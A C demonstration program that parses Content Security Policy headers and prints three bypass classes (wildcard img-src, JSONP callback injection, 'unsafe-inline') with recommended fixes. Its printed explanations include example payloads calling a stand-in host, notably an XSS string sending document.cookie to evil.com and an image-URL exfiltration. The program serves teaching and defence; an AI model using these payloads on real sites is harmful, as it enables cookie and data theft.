#include <stdio.h>
#include <string.h>
#include "csp_parser.h"
#include "csp_enforcer.h"

static void check(struct csp_policy *p, const char *directive,
                  const char *url, const char *note) {
    int allowed = csp_check(p, directive, url);
    printf("  [%s] %s '%s'\n    -> %s\n",
           directive, allowed ? "ALLOW" : "BLOCK", url, note);
}

static void banner(const char *title) {
    printf("\n═══════════════════════════════════════\n");
    printf(" %s\n", title);
    printf("═══════════════════════════════════════\n");
}

int main(void) {
    printf("B13 — Content Security Policy\n");

    /* ── Policy 1: realistic mixed policy ─────────────────────────── */
    banner("Policy 1: script-src 'self' https://cdn.example.com 'unsafe-inline'; img-src *; default-src 'none'");

    const char *hdr1 =
        "script-src 'self' https://cdn.example.com 'unsafe-inline'; "
        "img-src *; "
        "default-src 'none'";

    struct csp_policy p1;
    if (csp_parse(hdr1, &p1) != 0) {
        fprintf(stderr, "Parse error\n");
        return 1;
    }
    csp_print(&p1);

    printf("\nNormal enforcement:\n");
    check(&p1, "script-src", "https://cdn.example.com/lib.js",
          "cdn.example.com is whitelisted");
    check(&p1, "script-src", "https://evil.com/bad.js",
          "evil.com is not in script-src");
    check(&p1, "img-src", "https://evil.com/track.gif",
          "img-src is wildcard — all origins allowed");
    check(&p1, "default-src", "https://fonts.googleapis.com/font.woff",
          "default-src 'none' blocks everything not explicitly listed");

    /* ── Bypass 1: wildcard img-src ───────────────────────────────── */
    banner("BYPASS 1: Wildcard img-src");
    printf("Policy: img-src *\n");
    printf("Attack: load https://evil.com/track.gif as an <img>\n");
    int b1 = csp_check(&p1, "img-src", "https://evil.com/track.gif");
    printf("Result: %s\n", b1 ? "ALLOW (BYPASS!)" : "BLOCK");
    printf("Explanation: 'img-src *' permits ANY origin.\n"
           "  An attacker can exfiltrate data via URL params:\n"
           "  <img src='https://evil.com/log?data=SECRET'>\n"
           "  The wildcard was intended for CDN images but allows tracking pixels.\n");

    /* ── Bypass 2: JSONP endpoint ─────────────────────────────────── */
    banner("BYPASS 2: JSONP callback injection");

    const char *hdr2 = "script-src https://cdn.example.com";
    struct csp_policy p2;
    csp_parse(hdr2, &p2);

    const char *jsonp_url = "https://cdn.example.com/jsonp?callback=alert(1)//";
    int b2 = csp_check(&p2, "script-src", jsonp_url);
    printf("Policy: script-src https://cdn.example.com\n");
    printf("Attack URL: %s\n", jsonp_url);
    printf("CSP check result: %s\n", b2 ? "ALLOW" : "BLOCK");
    printf("Explanation: CSP sees domain 'cdn.example.com' → ALLOW.\n"
           "  But the server returns: alert(1)//({})\n"
           "  The callback param is reflected into a <script> body.\n"
           "  CSP domain allowlisting cannot inspect response content.\n"
           "  FIX: remove JSONP endpoints; use CORS + fetch() instead.\n");

    /* ── Bypass 3: unsafe-inline ──────────────────────────────────── */
    banner("BYPASS 3: unsafe-inline allows XSS");

    const char *hdr3 = "script-src 'self' 'unsafe-inline'";
    struct csp_policy p3;
    csp_parse(hdr3, &p3);

    int b3 = csp_check_inline_script(&p3);
    printf("Policy: script-src 'self' 'unsafe-inline'\n");
    printf("Attack: inject <script>attack()</script> via XSS\n");
    printf("Inline script allowed: %s\n", b3 ? "YES (BYPASS!)" : "NO");
    printf("Explanation: 'unsafe-inline' means ANY inline script runs.\n"
           "  An XSS injection like:\n"
           "    \"><script>document.location='https://evil.com/steal?c='+document.cookie</script>\n"
           "  is permitted by the policy.\n"
           "  'unsafe-inline' negates the core XSS protection of CSP.\n"
           "  FIX: use nonces (<script nonce='r4nd0m'>) or hashes instead.\n");

    /* ── Summary ──────────────────────────────────────────────────── */
    banner("Summary of Bypass Classes");
    printf("1. Wildcard sources (*, *.example.com) — attacker-controlled\n"
           "   subdomains or any origin satisfy the check.\n");
    printf("2. JSONP endpoints on trusted domains — CSP allows domain;\n"
           "   server returns attacker-controlled JS via callback param.\n");
    printf("3. 'unsafe-inline' — disables XSS protection entirely.\n"
           "   An injected <script> block executes freely.\n");
    printf("\nCorrect mitigations:\n"
           "  - Replace 'unsafe-inline' with nonces or hashes.\n"
           "  - Avoid wildcard host allowlists; enumerate exact origins.\n"
           "  - Audit trusted domains for open redirect / JSONP endpoints.\n"
           "  - Use report-uri / report-to to monitor real violations.\n");

    return 0;
}
